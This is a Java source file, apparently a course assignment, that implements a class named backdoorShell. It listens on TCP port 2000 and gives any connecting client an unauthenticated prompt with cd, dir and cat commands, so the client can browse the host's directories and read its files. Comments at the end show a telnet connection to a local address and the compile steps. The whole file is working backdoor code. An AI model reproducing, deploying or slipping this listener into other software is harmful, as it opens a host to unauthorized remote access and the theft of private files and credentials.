package ASSIN7;

import java.net.*;
import java.io.*;

public class backdoorShell extends Thread {
    private final Socket clientSocket;
    private String currentDirectory;

    public backdoorShell(Socket clientSocket) throws IOException {
        this.clientSocket = clientSocket;
        currentDirectory = System.getProperty("user.dir");
    }

    private String getCurrentDirectoryPrompt(String currentDirectory) {
        String prompt;
        if (System.getProperty("os.name").startsWith("Windows")) {
            prompt = currentDirectory + "> ";
        } else {
            prompt = currentDirectory + " % ";
        }
        return prompt;
    }


    public void run()
    {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
            {
                String commandPrompt = getCurrentDirectoryPrompt(currentDirectory);
                out.print(commandPrompt);
                out.flush();

                String line;
                while ((line = in.readLine()) != null) {
                    String[] tokens = line.split("\\s+");
                    switch (tokens[0]) {

                        case "cd":
                            if (tokens.length == 1) {
                                out.println(currentDirectory);
                                out.print(currentDirectory + "> ");
                                out.flush();
                                break;
                            }

                            String path = tokens[1];
                            if (path.equals(".")) {
                                // stay in the same directory
                            } else if (path.equals("~")) {
                                currentDirectory = System.getProperty("user.dir");
                            } else if (path.equals("..")) {
                                String parent = new File(currentDirectory).getParent();
                                if (parent != null) {
                                    currentDirectory = parent;
                                }
                            } else {
                                File file = new File(currentDirectory, path);
                                if (file.exists() && file.isDirectory()) {
                                    currentDirectory = file.getAbsolutePath();
                                } else {
                                    out.println("Directory not found: " + path);
                                }
                            }
                            commandPrompt = getCurrentDirectoryPrompt(currentDirectory);
                            out.print(commandPrompt);
                            out.flush();
                            break;


                        case "dir":
                            File directory = new File(currentDirectory);
                            if (directory.exists() && directory.isDirectory()) {
                                File[] files = directory.listFiles();
                                out.println("List of files in " + currentDirectory);
                                for (File file : files) {
                                    if (file.isDirectory()) {
                                        out.println(file.getName() + " - Directory");
                                    } else {
                                        out.println(file.getName() + " - File");
                                    }
                                }
                                out.println(files.length + " files in total");
                            } else {
                                out.println("Directory not found: " + currentDirectory);
                            }
                            out.print(getCurrentDirectoryPrompt(currentDirectory));
                            out.flush();
                            break;

                        case "cat":
                            String fileName = tokens[1];
                            File file = new File(currentDirectory, fileName);
                            if (!file.exists()) {
                                out.println("File " + fileName + " not found!");
                                break;
                            }
                            if (!file.isFile()) {
                                out.println(fileName + " is not a file!");
                                break;
                            }
                            try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                                String fileContent = "";
                                String lineContent;
                                while ((lineContent = br.readLine()) != null) {
                                    fileContent += lineContent + "\n";
                                }
                                out.println(fileContent);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            out.print(commandPrompt);
                            out.flush();
                            break;
                        default:
                            out.println("Unknown command: " + tokens[0]);
                            out.print(commandPrompt);
                            out.flush();
                            break;
                    }
                }
            }
        } catch (IOException e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    public static void main(String[] args) {
        try {
            ServerSocket serverSocket = new ServerSocket(2000);
            System.out.println("Listening on port " + 2000);
            Socket clientSocket = serverSocket.accept();
            Thread t1 = new backdoorShell(clientSocket);
            t1.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
//telnet 192.168.1.3 2000
//javac ASSIN7/*.java
//java  ASSIN7/t